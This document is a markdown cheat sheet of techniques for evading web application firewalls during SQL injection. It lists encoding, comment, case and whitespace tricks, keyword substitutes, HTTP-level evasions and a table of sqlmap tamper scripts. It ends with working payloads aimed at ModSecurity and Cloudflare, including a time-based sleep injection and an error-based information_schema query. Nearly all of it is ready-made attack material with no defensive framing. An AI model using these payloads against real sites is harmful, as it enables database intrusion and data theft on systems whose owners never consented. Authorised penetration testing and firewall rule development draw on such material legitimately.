# WAF Bypass Encyclopedia for SQL Injection

## Common WAF Behaviors
- Blocks keywords: `UNION`, `SELECT`, `FROM`, `WHERE`, `AND`, `OR`
- Blocks special chars: `'`, `"`, `;`, `--`, `#`
- Blocks functions: `SLEEP()`, `BENCHMARK()`, `LOAD_FILE()`
- Content-length or pattern-based detection

## Bypass Categories

### 1. Encoding
```
URL Encoding:       %27 %55NION %53ELECT
Double Encoding:    %2527 %2555NION %2553ELECT
Unicode:            %u0027 %u0055NION
Hex (MySQL):        0x756E696F6E = 'union'
HTML Entities:      &#39; &#x27;
```

### 2. Comments
```sql
/**/               → Space replacement
/*!UNION*/         → MySQL conditional execution
/*!50000UNION*/    → Version-specific conditional
/*! 12345UNION*/   → Padded version number
```

### 3. Case Switching
```sql
uNiOn SeLeCt       → Mixed case
UnIoN/**/sElEcT    → Mixed case + comments
```

### 4. Whitespace Alternatives
```
%09 (tab)   %0A (newline)   %0D (carriage return)
%0B (vertical tab)   %0C (form feed)   %A0 (NBSP - MySQL only)
```

### 5. Keyword Alternatives
```sql
-- UNION alternative
UNION ALL SELECT    → Sometimes bypasses UNION-only rules
1;SELECT            → Stacked query instead of UNION

-- AND/OR alternatives
&& / ||             → Logical operators
1 BETWEEN 1 AND 1  → BETWEEN instead of AND
1 IN (1)            → IN instead of =
1 LIKE 1            → LIKE instead of =

-- Quote alternatives
0x61646D696E        → Hex for 'admin' (MySQL)
CHAR(97,100,109)    → CHAR function
```

### 6. HTTP-Level Bypasses
```
-- Content-Type switching
application/x-www-form-urlencoded → application/json

-- Parameter pollution
?id=1&id=UNION+SELECT+1,2,3

-- Chunked transfer encoding
Transfer-Encoding: chunked

-- Method switching (GET ↔ POST)
```

### 7. sqlmap Tamper Quick Reference
| Tamper | Effect | Best For |
|--------|--------|----------|
| `space2comment` | `/**/` for spaces | Generic |
| `between` | BETWEEN for comparisons | Generic |
| `randomcase` | Random case keywords | Case-sensitive WAFs |
| `charencode` | URL-encode chars | URL-based WAFs |
| `equaltolike` | LIKE for = | Equality filters |
| `space2hash` | `#\n` for spaces | MySQL |
| `space2mssqlblank` | Alt whitespace | MSSQL |
| `percentage` | %char encoding | IIS/ASP |
| `space2morehash` | Multiple hash comments | MySQL strict |
| `chardoubleencode` | Double URL encode | Double-decode WAFs |
| `unionalltounion` | UNION ALL variants | UNION filters |
| `halfversionedmorekeywords` | /*!0keyword*/ | MySQL |
| `modsecurityzeroversioned` | /*!00000keyword*/ | ModSecurity |

### 8. ModSecurity Specific Bypasses
```sql
/*!00000UNION*/+/*!00000SELECT*/+1,2,3
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
```

### 9. Cloudflare Specific Bypasses
```sql
/*!50000%55nion*/ /*!50000%53elect*/ 1,2,3
' AND 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```
